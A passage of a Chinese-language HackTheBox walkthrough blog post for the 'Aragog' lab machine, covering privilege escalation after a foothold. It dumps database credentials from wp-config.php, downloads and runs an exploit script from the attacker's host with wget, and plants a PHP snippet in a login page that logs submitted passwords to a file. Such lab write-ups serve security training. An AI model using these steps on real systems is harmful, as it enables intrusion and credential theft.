+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">florian@aragog:~$ <span class="hljs-built_in">ls</span> -a<br>.              .bash_history  .config  .gnupg          .nano                      .xsession-errors      Downloads  Templates<br>..             .bash_logout   .dbus    .<span class="hljs-built_in">local</span>          .profile                   .xsession-errors.old  Music      Videos<br>.ICEauthority  .bashrc        .dmrc    .mozilla        .ssh                       Desktop               Pictures   examples.desktop<br>.Xauthority    .cache         .gconf   .mysql_history  .sudo_as_admin_successful  Documents             Public     user.txt<br>florian@aragog:~$ netstat -antp<br>(No info could be <span class="hljs-built_in">read</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&quot;-p&quot;</span>: geteuid()=1000 but you should be root.)<br>Active Internet connections (servers and established)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name<br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               <br>tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               <br>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               <br>tcp        0      0 127.0.0.1:43106         127.0.0.1:80            TIME_WAIT   -               <br>tcp        0    476 10.10.10.78:22          10.10.16.3:37292        ESTABLISHED -               <br>tcp6       0      0 :::80                   :::*                    LISTEN      -               <br>tcp6       0      0 :::21                   :::*                    LISTEN      -               <br>tcp6       0      0 :::22                   :::*                    LISTEN      -               <br>tcp6       0      0 ::1:631                 :::*                    LISTEN      -         <br></code></pre></td></tr></table></figure>
+
+<p>在/var/www/html/dev_wiki似乎还有一个wordpress站点，里边有个数据库的凭证：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs bash">florian@aragog:/var/www/html/dev_wiki$ <span class="hljs-built_in">ls</span><br>index.php    wp-activate.php     wp-comments-post.php  wp-cron.php        wp-load.php   wp-settings.php   xmlrpc.php<br>license.txt  wp-admin            wp-config.php         wp-includes        wp-login.php  wp-signup.php<br>readme.html  wp-blog-header.php  wp-content            wp-links-opml.php  wp-mail.php   wp-trackback.php<br>florian@aragog:/var/www/html/dev_wiki$ <span class="hljs-built_in">cat</span> wp-con<br>wp-config.php  wp-content/    <br>florian@aragog:/var/www/html/dev_wiki$ <span class="hljs-built_in">cat</span> wp-config.php <br>&lt;?php<br>/**<br> * The base configuration <span class="hljs-keyword">for</span> WordPress<br> *<br> * The wp-config.php creation script uses this file during the<br> * installation. You don<span class="hljs-string">&#x27;t have to use the web site, you can</span><br><span class="hljs-string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * This file contains the following configurations:</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * * MySQL settings</span><br><span class="hljs-string"> * * Secret keys</span><br><span class="hljs-string"> * * Database table prefix</span><br><span class="hljs-string"> * * ABSPATH</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @package WordPress</span><br><span class="hljs-string"> */</span><br><span class="hljs-string"></span><br><span class="hljs-string">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="hljs-string">/** The name of the database for WordPress */</span><br><span class="hljs-string">define(&#x27;</span>DB_NAME<span class="hljs-string">&#x27;, &#x27;</span>wp_wiki<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database username */</span><br><span class="hljs-string">define(&#x27;</span>DB_USER<span class="hljs-string">&#x27;, &#x27;</span>root<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database password */</span><br><span class="hljs-string">define(&#x27;</span>DB_PASSWORD<span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-variable">$@y6CHJ</span>^$<span class="hljs-comment">#5c37j$#6h&#x27;);</span><br><br>/** MySQL hostname */<br>define(<span class="hljs-string">&#x27;DB_HOST&#x27;</span>, <span class="hljs-string">&#x27;localhost&#x27;</span>);<br><br>/** Database Charset to use <span class="hljs-keyword">in</span> creating database tables. */<br>define(<span class="hljs-string">&#x27;DB_CHARSET&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br><br>/** The Database Collate <span class="hljs-built_in">type</span>. Don<span class="hljs-string">&#x27;t change this if in doubt. */</span><br><span class="hljs-string">define(&#x27;</span>DB_COLLATE<span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/**#@+</span><br><span class="hljs-string"> * Authentication Unique Keys and Salts.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * Change these to different unique phrases!</span><br><span class="hljs-string"> * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span><br><span class="hljs-string"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @since 2.6.0</span><br><span class="hljs-string"> */</span><br><span class="hljs-string">define(&#x27;</span>AUTH_KEY<span class="hljs-string">&#x27;,         &#x27;</span>put your unique phrase here<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">define(&#x27;</span>SECURE_AUTH_KEY<span class="hljs-string">&#x27;,  &#x27;</span>put your unique phrase here<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">define(&#x27;</span>LOGGED_IN_KEY<span class="hljs-string">&#x27;,    &#x27;</span>put your unique phrase here<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">define(&#x27;</span>NONCE_KEY<span class="hljs-string">&#x27;,        &#x27;</span>put your unique phrase here<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">define(&#x27;</span>AUTH_SALT<span class="hljs-string">&#x27;,        &#x27;</span>put your unique phrase here<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">define(&#x27;</span>SECURE_AUTH_SALT<span class="hljs-string">&#x27;, &#x27;</span>put your unique phrase here<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">define(&#x27;</span>LOGGED_IN_SALT<span class="hljs-string">&#x27;,   &#x27;</span>put your unique phrase here<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">define(&#x27;</span>NONCE_SALT<span class="hljs-string">&#x27;,       &#x27;</span>put your unique phrase here<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/**#@-*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">/**</span><br><span class="hljs-string"> * WordPress Database Table prefix.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * You can have multiple installations in one database if you give each</span><br><span class="hljs-string"> * a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="hljs-string"> */</span><br><span class="hljs-string">$table_prefix  = &#x27;</span>wp_<span class="hljs-string">&#x27;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">/**</span><br><span class="hljs-string"> * For developers: WordPress debugging mode.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * Change this to true to enable the display of notices during development.</span><br><span class="hljs-string"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="hljs-string"> * in their development environments.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * For information on other constants that can be used for debugging,</span><br><span class="hljs-string"> * visit the Codex.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @link https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class="hljs-string"> */</span><br><span class="hljs-string">define(&#x27;</span>WP_DEBUG<span class="hljs-string">&#x27;, false);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* That&#x27;</span>s all, stop editing! Happy blogging. */<br><br>/** Absolute path to the WordPress directory. */<br><span class="hljs-keyword">if</span> ( !defined(<span class="hljs-string">&#x27;ABSPATH&#x27;</span>) )<br>        define(<span class="hljs-string">&#x27;ABSPATH&#x27;</span>, <span class="hljs-built_in">dirname</span>(__FILE__) . <span class="hljs-string">&#x27;/&#x27;</span>);<br><br>/** Sets up WordPress vars and included files. */<br>require_once(ABSPATH . <span class="hljs-string">&#x27;wp-settings.php&#x27;</span>);<br>florian@aragog:/var/www/html/dev_wiki$ <br></code></pre></td></tr></table></figure>
+
+<p>里边有密码，但是破解不出来：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; select * from wp_users;<br>+----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+<br>| ID | user_login    | user_pass                          | user_nicename | user_email      | user_url | user_registered     | user_activation_key | user_status | display_name  |<br>+----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+<br>|  1 | Administrator | $P<span class="hljs-variable">$B3FUuIdSDW0IaIc4vsjj</span>.NzJDkiscu. | administrator | it@megacorp.com |          | 2017-12-20 23:26:04 |                     |           0 | Administrator |<br>+----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="Root-txt"><a href="#Root-txt" class="headerlink" title="Root.txt:"></a>Root.txt:</h4><p>介于这机器退休很久了，其系统版本落后存在很多提权漏洞：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">florian@aragog:~$ wget http://10.10.16.3/pwk.py<br>--2022-08-28 19:41:56--  http://10.10.16.3/pwk.py<br>Connecting to 10.10.16.3:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 3448 (3.4K) [text/x-python]<br>Saving to: <span class="hljs-string">&#x27;pwk.py&#x27;</span><br><br>pwk.py                                                               100%[===================================================================================================================================================================&gt;]   3.37K  --.-KB/s    <span class="hljs-keyword">in</span> 0.001s  <br><br>2022-08-28 19:41:56 (6.07 MB/s) - <span class="hljs-string">&#x27;pwk.py&#x27;</span> saved [3448/3448]<br><br>florian@aragog:~$ python3 pwk.py <br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),1000(florian)<br><span class="hljs-comment"># cat /root/root.txt</span><br>9a9d.................................<br></code></pre></td></tr></table></figure>
+
+<p>作者实际留的路径应该是这里：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">2022/08/28 19:46:15 CMD: UID=0    PID=10     | <br>2022/08/28 19:46:15 CMD: UID=0    PID=1      | /sbin/init auto noprompt <br>2022/08/28 19:47:01 CMD: UID=1001 PID=2657   | /usr/bin/python /home/cliff/wp-login.py <br>2022/08/28 19:47:01 CMD: UID=1001 PID=2656   | /bin/sh -c /usr/bin/python /home/cliff/wp-login.py <br>2022/08/28 19:47:01 CMD: UID=0    PID=2655   | /usr/sbin/CRON -f <br>2022/08/28 19:47:01 CMD: UID=1001 PID=2658   | /usr/bin/python /home/cliff/wp-login.py <br>2022/08/28 19:47:01 CMD: UID=1001 PID=2661   | <br>2022/08/28 19:47:01 CMD: UID=1001 PID=2660   | sh -c <span class="hljs-built_in">uname</span> -p 2&gt; /dev/null <br>2022/08/28 19:48:01 CMD: UID=1001 PID=2664   | /usr/bin/python /home/cliff/wp-login.py <br>2022/08/28 19:48:01 CMD: UID=1001 PID=2663   | /bin/sh -c /usr/bin/python /home/cliff/wp-login.py <br>2022/08/28 19:48:01 CMD: UID=0    PID=2662   | /usr/sbin/CRON -f <br>2022/08/28 19:48:01 CMD: UID=1001 PID=2665   | /usr/bin/python /home/cliff/wp-login.py <br>2022/08/28 19:48:01 CMD: UID=1001 PID=2667   | /usr/bin/python /home/cliff/wp-login.py <br>2022/08/28 19:48:01 CMD: UID=1001 PID=2668   | <br>2022/08/28 19:49:01 CMD: UID=1001 PID=2671   | /usr/bin/python /home/cliff/wp-login.py <br>2022/08/28 19:49:01 CMD: UID=1001 PID=2670   | /bin/sh -c /usr/bin/python /home/cliff/wp-login.py <br>2022/08/28 19:49:01 CMD: UID=0    PID=2669   | /usr/sbin/CRON -f <br>2022/08/28 19:49:01 CMD: UID=1001 PID=2672   | <br>2022/08/28 19:49:01 CMD: UID=1001 PID=2675   | sh -c <span class="hljs-built_in">uname</span> -p 2&gt; /dev/null <br>2022/08/28 19:49:01 CMD: UID=1001 PID=2674   | sh -c <span class="hljs-built_in">uname</span> -p 2&gt; /dev/null <br></code></pre></td></tr></table></figure>
+
+<p>每过一段时间就会以用户1001身份运行一些进程。他在一直回复wordpress站点，而wp-login.py 看起来像是在自动登录wordpress站点。可以更改wp-login去接收用户输入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$rrr</span> = print_r(<span class="hljs-variable">$_REQUEST</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-variable">$fff</span> = fopen(<span class="hljs-string">&quot;/dev/shm/pwd&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>fwrite(<span class="hljs-variable">$fff</span>, <span class="hljs-variable">$rrr</span>);<br>fclose(<span class="hljs-variable">$fff</span>);<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">florian@aragog:/dev/shm$ <span class="hljs-built_in">cat</span> <span class="hljs-built_in">pwd</span> <br>Array<br>(<br>    [<span class="hljs-built_in">pwd</span>] =&gt; !KRgYs(JFO!&amp;MTr)lf<br>    [wp-submit] =&gt; Log In<br>    [testcookie] =&gt; 1<br>    [<span class="hljs-built_in">log</span>] =&gt; Administrator<br>    [redirect_to] =&gt; http://127.0.0.1/dev_wiki/wp-admin/<br>)<br></code></pre></td></tr></table></figure>
+
+<p>这是root的密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">florian@aragog:/dev/shm$ <span class="hljs-built_in">cd</span> /home/<br>florian@aragog:/home$ <span class="hljs-built_in">ls</span><br>cliff  florian<br>florian@aragog:/home$ su cliff<br>Password: <br>su: Authentication failure<br>florian@aragog:/home$ su root<br>Password: <br>root@aragog:/home<span class="hljs-comment"># cat /root/root.txt </span><br>9a9...............................<br>root@aragog:/home<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Aragog</div>
+      <div>http://example.com/2022/10/06/HackTheBox-Aragog/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>CrazyInSide</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/Active%20Directory%20%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%8A%A0%E5%9B%BA/" title="Active Directory 安全性与加固">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Active Directory 安全性与加固</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Backdoor/" title="HackTheBox-Backdoor">
+                        <span class="hidden-mobile">HackTheBox-Backdoor</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
